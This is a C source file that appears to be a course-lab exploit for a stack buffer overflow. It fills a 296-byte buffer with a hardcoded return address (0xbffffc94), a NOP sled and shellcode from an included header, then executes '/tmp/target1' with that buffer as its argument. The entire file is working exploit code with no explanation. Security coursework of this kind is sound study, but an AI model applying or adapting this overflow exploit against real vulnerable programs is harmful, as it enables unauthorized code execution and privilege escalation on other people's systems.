#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
#define NOP 0x90

unsigned long get_sp(void) {
        __asm__("movl %esp, %eax");
}

int main(void)
{
  printf("%x\n",get_sp());
  char *args[3];
  char *env[1];

  int buff_size = 296;
  char* buff = (char*)malloc(sizeof(char) * buff_size);
  long addr = 0xbffffc94;

  int index;
  char* ptr = buff;
  long* buff_ptr = (long*) buff;
  for(index=0; index< buff_size-1; index+=4){
        * (buff_ptr++) = addr;
  }
  //Fill half the buffer with NOP
  for(index=0; index< 171; index++){
        buff[index] = NOP;
  }

  ptr = buff+ 171;
  for (index = 0; index< strlen(shellcode); index++)
        *(ptr++) = shellcode[index];

  buff[buff_size-1] = '\0';
  args[0] = TARGET; args[1] = buff; args[2]= NULL;
  env[0] = NULL;

  printf("%x\n",get_sp());
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}